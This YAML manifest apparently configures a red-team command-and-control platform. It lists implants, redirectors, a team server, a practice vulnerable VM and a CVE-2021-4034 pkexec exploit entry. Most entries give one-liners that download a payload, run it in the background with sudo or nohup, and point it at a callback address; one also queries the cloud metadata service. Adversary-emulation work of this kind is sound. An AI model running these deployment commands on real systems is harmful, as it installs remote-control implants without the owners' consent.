translators:
  metadata:
    description: An extra Operator listening post for redirectors
    purpose: redirector
    build: echo
  payloads:
    ftp.tar.gz:
      install: |
        mkdir -p /tmp/translators && \
        curl 'PAYLOAD.URL' > /tmp/translators/ftp.tar.gz && \
        tar xzf /tmp/translators/ftp.tar.gz -C /tmp/translators && \
        sudo pip3 install -r /tmp/translators/ftp/requirements.txt && \
        nohup sudo python3 /tmp/translators/ftp/server.py &
    grpc.tar.gz:
      install: |
        mkdir -p /tmp/translators && \
        curl 'PAYLOAD.URL' > /tmp/translators/grpc.tar.gz && \
        tar xzf /tmp/translators/grpc.tar.gz -C /tmp/translators && \
        sudo pip3 install -r /tmp/translators/grpc/requirements.txt && \
        nohup sudo python3 /tmp/translators/grpc/server.py &

pneuma:
  metadata:
    description: The default open-source agent written in GoLang
    purpose: agent
    zip: 1
    build: echo
    platforms:
      - linux
      - windows
      - darwin
    protocols:
      - tcp
      - http
      - udp
      - grpc
  payloads:
    pneuma-linux:
      install: |
        curl 'PAYLOAD.URL' > /tmp/pneuma && chmod +x /tmp/pneuma && nohup /tmp/pneuma -name $(echo $HOSTNAME) -address #{callback} -range "Cloud" &
    pneuma-windows.exe:
      install: |
        mkdir "c:\aws\download"
        Set-Location "c:\aws\download"
        $wc = New-Object System.Net.WebClient
        $myurl="PAYLOAD.URL"
        $wc.DownloadFile("$myurl","C:\aws\download\pneuma-windows.exe")
        Start-Process -FilePath C:\aws\download\pneuma-windows.exe -ArgumentList "-name $env:COMPUTERNAME -address #{callback} -range Cloud"
    pneuma-darwin: {}

schism:
  metadata:
    description: Simple Python agent (FTP requires a translator)
    purpose: agent
    zip: 1
    build: echo
    platforms: 
      - windows
      - linux
      - darwin
      - android
    protocols:
      - ftp
      - http
  payloads:
    schism-ftp.py:
      install: |
        curl 'PAYLOAD.URL' > /tmp/schism && chmod +x /tmp/schism && pip install ftplib && nohup /tmp/schism -address #{callback} &
    schism-android.py: {}
    schism-http.py: {}

nicodemus:
  metadata:
    description: Nicodemus is a cross-platform Nim implant written by Roger Johnston (VVX7 - https://github.com/VVX7/nicodemus).
    purpose: agent
    zip: 1
    build: echo
    platforms:
      - windows
      - linux
      - darwin
    protocols:
      - http
      - tcp
      - udp
  payloads:
    nicodemus-darwin: {}
    nicodemus-linux: {}
    nicodemus-windows.exe: {}

ctf:
  metadata:
    description: Create a vulnerable environment to practice against
    purpose: virtualmachine
    build: echo
    platforms: 
      - linux
  payloads:
    vulnerable.sh:
      install: curl 'PAYLOAD.URL' > tmp/vulnerable.sh && chmod +x /tmp/vulnerable.sh && sudo ./vulnerable.sh

headless:
  metadata:
    description: Headless Operator API / Team Server
    purpose: redirector
    required: team
    default: team
    build: echo
  payloads:
    headless:
      install: |
        mkdir -p /tmp/headless && curl 'PAYLOAD.URL' > /tmp/headless/bin && chmod +x /tmp/headless/bin && ssh-keygen -t rsa -f /tmp/headless/ssh_key -q -N '' && nohup sudo /tmp/headless/bin --sessionToken 'TOOL.PSK' --sshKey /tmp/headless/ssh_key --hostName $(curl http://169.254.169.254/latest/meta-data/public-hostname) >/tmp/headless/headless.log 2>&1  &

plugins:
  metadata:
    description: Prelude Operator Community Plugins
    purpose: plugin
    build: echo
  payloads:
    Editor.html: {}
    Connect.html: {}

CVE-2021-4034:
  metadata:
    description: CVE-2021-4034 payloads
    build: echo
    payloads:
      blasty-vs-pkexec.c: {}
